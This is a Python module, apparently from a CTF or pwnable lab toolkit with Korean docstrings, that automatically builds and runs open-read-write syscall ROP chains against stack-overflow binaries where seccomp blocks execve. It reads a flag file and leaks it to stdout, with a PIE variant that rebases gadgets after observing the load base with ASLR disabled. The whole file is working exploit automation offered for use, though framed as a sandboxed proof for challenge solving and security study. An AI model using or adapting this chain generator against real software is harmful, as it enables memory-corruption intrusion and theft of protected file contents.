"""완전 자동 ORW(open→read→write) syscall ROP — seccomp 로 execve 가 막힌 경우.

seccomp 필터가 ``execve``/``execveat`` 를 차단하면 셸(execve/system) 전제가 깨진다
(:mod:`analyzer.seccomp`). 대신 ``open``/``read``/``write`` 가 허용되면 플래그 파일을
열어 읽고 stdout 으로 유출하는 것이 표준 전략이다. 이 모듈은 그 ROP 체인을 자동
구성해 샌드박스에서 실행하고, **플래그 내용이 stdout 으로 유출되는지**로 성공을
증명한다(셸 획득이 아니라 플래그 유출 증명).

대상은 **non-PIE amd64** 다 — 가젯·문자열·버퍼 주소가 절대주소라 base leak 없이
성립한다. 플래그 경로 문자열이 바이너리 안에 있어야 그 주소를 쓴다(대부분의 ORW
챌린지가 그렇다).
"""

from __future__ import annotations

from pathlib import Path

from pwnable_lab.analyzer.strategy import find_string, is_pie, orw_plan
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.runner import SandboxLimits, resolve_pie_base, run_with_input

# open/read/write 시스템콜 번호(amd64).
_SYS_OPEN, _SYS_READ, _SYS_WRITE = 2, 0, 1


def _orw_payload(plan: dict, flag_addr: int, offset: int, read_size: int) -> bytes:
    """ORW open→read→write syscall ROP payload 를 만든다(주소는 이미 해석된 상태)."""

    buf = plan["buf"]

    def call(nr: int, a: int, b: int, c: int) -> list[RopStep]:
        return [
            RopStep(plan["pop_rdi"]),
            RopStep(a),
            RopStep(plan["pop_rsi"]),
            RopStep(b),
            RopStep(plan["pop_rdx"]),
            RopStep(c),
            RopStep(plan["pop_rax"]),
            RopStep(nr),
            RopStep(plan["syscall"]),
        ]

    chain = (
        call(_SYS_OPEN, flag_addr, 0, 0)
        + call(_SYS_READ, 3, buf, read_size)
        + call(_SYS_WRITE, 1, buf, read_size)
    )
    return build_overflow(offset, chain[0].value, bits=64, chain=chain[1:])


def _judge(stdout: bytes, expect_marker: str | None) -> tuple[bool, str]:
    if expect_marker is not None:
        ok = expect_marker.encode() in stdout
        return ok, ("flag-leaked" if ok else "marker-not-found")
    ok = len(stdout.strip(b"\x00").strip()) > 0
    return ok, ("output-captured" if ok else "no-output")


def auto_orw(
    binary_path: str,
    *,
    offset: int,
    flag_path: str,
    read_size: int = 100,
    expect_marker: str | None = None,
    limits: SandboxLimits | None = None,
) -> dict:
    """ORW syscall ROP 를 자동 구성·실행해 플래그 유출을 증명한다(non-PIE amd64).

    ``flag_path`` 문자열이 바이너리에 있어야 하며, 그 파일을 열어 ``read_size`` 바이트
    읽어 stdout 으로 쓴다. ``expect_marker`` 가 주어지면 유출 출력에 그 마커가 있어야
    성공으로 본다(없으면 비어있지 않은 출력이면 성공).
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        return {"attempted": False, "reason": "pie-needs-base-leak"}

    plan = orw_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-orw-plan"}
    flag_addr = find_string(image, flag_path.encode() + b"\x00") or find_string(
        image, flag_path.encode()
    )
    if flag_addr is None:
        return {"attempted": False, "reason": "flag-path-not-in-binary"}

    limits = limits or SandboxLimits()
    payload = _orw_payload(plan, flag_addr, offset, read_size)
    obs = run_with_input(binary_path, payload, capture_stdout=True, limits=limits)
    leaked = obs.stdout or b""
    succeeded, reason = _judge(leaked, expect_marker)
    return {
        "attempted": True,
        "technique": "orw",
        "offset": offset,
        "flag_addr_hex": f"0x{flag_addr:x}",
        "buf_hex": f"0x{plan['buf']:x}",
        "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
        "syscall_hex": f"0x{plan['syscall']:x}",
        "succeeded": succeeded,
        "reason": reason,
        "leaked": leaked.split(b"\x00", 1)[0].decode("utf-8", "replace"),
        "leaked_hex": leaked[:256].hex(),
    }


def auto_orw_pie(
    binary_path: str,
    *,
    offset: int,
    flag_path: str,
    read_size: int = 100,
    expect_marker: str | None = None,
    limits: SandboxLimits | None = None,
) -> dict:
    """PIE 판 ORW: 로드 base 를 로컬 관측(ASLR-off)해 rebase 한 뒤 플래그를 유출한다.

    non-PIE 판과 달리 가젯·문자열·버퍼가 base 상대이므로, :func:`resolve_pie_base` 로
    관측한 base 로 전부 rebase 한다. 같은 ASLR-off 조건에서 실행해 관측·검증 base 가
    일치한다(로컬 익스 증명, 원격 ASLR 우회 아님 → ``aslr="disabled-for-local-proof"``).
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if not is_pie(image):
        return {"attempted": False, "reason": "not-pie"}

    plan = orw_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-orw-plan"}
    flag_off = find_string(image, flag_path.encode() + b"\x00") or find_string(
        image, flag_path.encode()
    )
    if flag_off is None:
        return {"attempted": False, "reason": "flag-path-not-in-binary"}

    limits = limits or SandboxLimits()
    base_res = resolve_pie_base(binary_path, limits=limits)
    if not base_res.confirmed or base_res.base is None:
        return {"attempted": False, "reason": "pie-base-unresolved"}
    base = base_res.base

    rebased = {k: base + v for k, v in plan.items()}
    payload = _orw_payload(rebased, base + flag_off, offset, read_size)
    obs = run_with_input(
        binary_path, payload, capture_stdout=True, limits=limits, disable_aslr=True
    )
    leaked = obs.stdout or b""
    succeeded, reason = _judge(leaked, expect_marker)
    return {
        "attempted": True,
        "technique": "orw-pie",
        "offset": offset,
        "base_hex": f"0x{base:x}",
        "flag_addr_hex": f"0x{base + flag_off:x}",
        "buf_hex": f"0x{rebased['buf']:x}",
        "succeeded": succeeded,
        "reason": reason,
        "aslr": "disabled-for-local-proof",
        "leaked": leaked.split(b"\x00", 1)[0].decode("utf-8", "replace"),
        "leaked_hex": leaked[:256].hex(),
    }


__all__ = ["auto_orw", "auto_orw_pie"]
